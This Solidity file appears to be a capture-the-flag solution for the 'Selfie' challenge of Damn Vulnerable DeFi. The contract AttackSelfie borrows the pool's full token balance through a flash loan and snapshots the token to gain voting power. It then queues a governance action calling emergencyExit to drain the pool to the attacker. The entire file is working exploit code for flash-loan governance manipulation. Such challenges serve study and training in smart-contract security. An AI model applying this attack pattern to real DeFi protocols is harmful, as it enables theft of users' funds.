// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./SelfiePool.sol";
import "./SimpleGovernance.sol";
import "../DamnValuableTokenSnapshot.sol";

contract AttackSelfie {
    SelfiePool public pool;
    DamnValuableTokenSnapshot public token;
    SimpleGovernance public governance;

    constructor(address pool_, address token_, address governance_) {
        pool = SelfiePool(pool_);
        token = DamnValuableTokenSnapshot(token_);
        governance = SimpleGovernance(governance_);
    }

    function attack() external {
        uint256 amount = pool.maxFlashLoan(address(token));
        bytes memory data = abi.encodeWithSignature("emergencyExit(address)", msg.sender);
        pool.flashLoan(IERC3156FlashBorrower(address(this)), address(token), amount, data);
    }

    function onFlashLoan(address, address token_, uint256 amount, uint256, bytes calldata data)
        external
        returns (bytes32)
    {
        DamnValuableTokenSnapshot(token_).snapshot();

        governance.queueAction(address(pool), 0, data);

        DamnValuableTokenSnapshot(token_).approve(address(pool), amount);

        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }
}
